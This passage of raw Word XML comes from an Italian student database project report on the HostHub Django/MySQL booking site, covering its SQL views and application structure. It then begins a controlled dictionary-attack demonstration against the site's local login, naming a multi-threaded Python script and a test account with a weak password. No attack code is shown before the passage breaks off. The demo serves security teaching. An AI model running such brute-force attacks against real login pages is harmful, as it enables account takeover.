            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6626120C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_statistiche_servizi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5D8F50DE" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra quanto sono diffusi i servizi negli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="506DFA37" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46D0643F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_top_destinazioni</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43A29D01" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra le città più rilevanti per alloggi e prenotazioni.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2624FB6E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel file models.py del progetto Django le viste risultano mappate come modelli con managed = False. Questa impostazione indica che Django può leggere le viste come normali modelli, ma non deve occuparsi della loro creazione o modifica. È una scelta coerente con un progetto in cui il database è stato progettato direttamente a livello SQL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73CE7091" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>11. Implementazione con Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C16110" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Dall'analisi del repository GitHub di HostHub risulta che l'applicazione Django è stata utilizzata come livello applicativo sopra un database MySQL già progettato. Il README del progetto indica l'uso di Django, Python e MySQL su WSL, mentre il file dump.sql contiene la struttura del database, i dati iniziali, i trigger e le viste. L'obiettivo dell'implementazione non è sostituire la progettazione SQL, ma mostrare come le tabelle, le chiavi esterne e le viste possano essere usate concretamente in un sito web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B57C5B" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Struttura generale dell'applicazione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077064DC" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">La struttura del progetto è abbastanza lineare: la cartella principale contiene manage.py, dump.sql, README.md e i file di configurazione; la cartella sito_hosthub contiene le impostazioni generali del progetto Django e il file urls.py; la cartella core contiene invece l'applicazione principale, con models.py, views.py, templates e file di supporto. Le rotte principali collegano le pagine del sito alle view presenti in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>core.views</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: home, lista degli alloggi, dettaglio e prenotazione di un alloggio, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>lista</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e dettaglio delle esperienze, registrazione, login, profilo utente, dashboard host e modifica dell'alloggio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDA0F6E" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel file models.py le tabelle del database sono rappresentate come classi Django. La maggior parte dei modelli usa managed = False: questo significa che Django legge e aggiorna tabelle già esistenti, ma non è il responsabile della loro creazione tramite migrazioni. Questa scelta è coerente con un progetto di Basi di Dati, perché lo schema relazionale è stato progettato e importato tramite SQL, mentre Django svolge il ruolo di interfaccia applicativa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318EF90C" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Funzionalità principali e collegamento con il database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F502EC" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Le funzionalità applicative sono collegate direttamente alle tabelle progettate nel modello relazionale. La home page utilizza le viste vista_top_destinazioni e vista_classifica_alloggi per mostrare città e alloggi in </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>evidenza. La lista degli alloggi interroga alloggio e citta, permettendo filtri per tipologia, prezzo, destinazione e capienza. La pagina di dettaglio di un alloggio usa alloggio, prenotazione_alloggio e recensione_alloggio, perché mostra i dati dell'immobile, permette la prenotazione e visualizza i commenti collegati alle prenotazioni già effettuate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567DEF1A" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La parte relativa alle esperienze usa invece esperienze, agenzia, prenotazione_esperienze e recensione_esperienze. Il profilo utente recupera le prenotazioni dell'utente sia per gli alloggi sia per le esperienze e consente l'inserimento delle recensioni solo quando il servizio è stato effettivamente concluso. La dashboard host collega utente, host, alloggio e prenotazione_alloggio: in questo modo dimostra concretamente la scelta progettuale secondo cui l'host è una specializzazione dell'utente e non un soggetto separato.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384A8A58" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Nel repository non è stato individuato un file forms.py separato: i form sono gestiti principalmente dentro views.py tramite request.GET e request.POST. Questo approccio è semplice, ma sufficiente per mostrare il passaggio dei dati dalle pagine HTML al database. Sono inoltre presenti query SQL personalizzate con </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>connection.cursor</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>(), usate soprattutto quando servono filtri dinamici o dati aggregati non immediatamente espressi tramite ORM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A462F7" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Ruolo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> di Django rispetto al database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B75521C" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel progetto HostHub Django svolge soprattutto tre compiti. Il primo è recuperare i dati dal database e passarli ai template HTML, rendendo consultabili tabelle e viste SQL attraverso pagine web. Il secondo è ricevere i dati inseriti dagli utenti tramite form, validarli a livello applicativo e salvarli nelle tabelle corrette. Il terzo è organizzare le funzionalità in pagine coerenti con i ruoli previsti dal database: utente, host e agenzia.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDBAE60" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Le viste SQL sono usate per semplificare alcune schermate, come destinazioni in evidenza, classifiche e dashboard. Le tabelle principali restano invece centrali nelle operazioni che modificano i dati, come registrazioni, prenotazioni, recensioni e aggiornamento degli alloggi. In questo modo si mantiene una distinzione abbastanza chiara: il database conserva la struttura e le regole fondamentali dei dati, mentre Django fornisce l'interfaccia con cui l'utente interagisce.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBD672D" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Non è stata verificata nel repository una dashboard agenzia completa analoga alla dashboard host, anche se nel database è presente la vista vista_dashboard_guadagni_agenzia. Questo significa che la parte relativa alle agenzie è prevista nello schema e nelle viste SQL, ma nel codice Django analizzato risulta meno sviluppata rispetto alla gestione degli host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492BFC11" w14:textId="77777777" w:rsidR="00172278" w:rsidRDefault="00000000">
      <w:r>
        <w:t>In conclusione, l'implementazione Django non rappresenta una parte separata dal database, ma mostra concretamente come lo schema relazionale progettato venga utilizzato per costruire le funzionalità principali della piattaforma HostHub.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF30942" w14:textId="5D1F94B6" w:rsidR="00314A9E" w:rsidRDefault="00000000">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>semplici</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rendere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> il progetto </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>adatto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>contesto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>universitario</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, senza </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>introdurre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>complessità</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> non </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>necessarie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6853D52D" w14:textId="492B8BA1" w:rsidR="00E07933" w:rsidRDefault="00E07933" w:rsidP="00E07933">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Capitolo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r w:rsidR="002F0F19">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Dimostrazione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attacco</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dizionario</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>possibili</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>contromisure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5EDFAEE3" w14:textId="6D117D52" w:rsidR="00E07933" w:rsidRPr="00E07933" w:rsidRDefault="00E07933" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>completare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> la </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>parte</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>relativa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> alla </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sicurezza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>applicativa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>effettuata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>una</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>simulazione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>controllata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attacco</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dizionario</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>contro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sistema</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>autenticazione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HostHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Lo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>scopo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dimostrare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ambiente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> locale, come un account con password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>debole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>possa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>essere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>violato</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> se non </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sono</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>presenti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>limitazioni</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> sui </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tentativi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di login. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>L’attacco</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>utilizza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> uno script Python multi-thread, con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>comunicazione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> HTTP verso la </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pagina</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di login di Django, senza </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mai</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>interagire</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>direttamente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> con il database.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00484D0A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">13.1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00484D0A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Obiettivo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00484D0A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> della </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00484D0A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>simulazione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>L’obiettivo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dimostrare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>che</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attaccante</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>disponendo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dell’email</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di un account di test e di un file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>contenente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>comuni</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>può</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>provare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>automaticamente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>più</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fino</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>trovare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>quella</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>corretta</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>L’account</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di test ha:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Email: hosthub@gmail.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- Password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>volutamente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>debole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: hosthub123</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Il file dizionario.txt </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>contiene</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>alcune</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>comuni</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>incluso</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>l’account</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di test.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
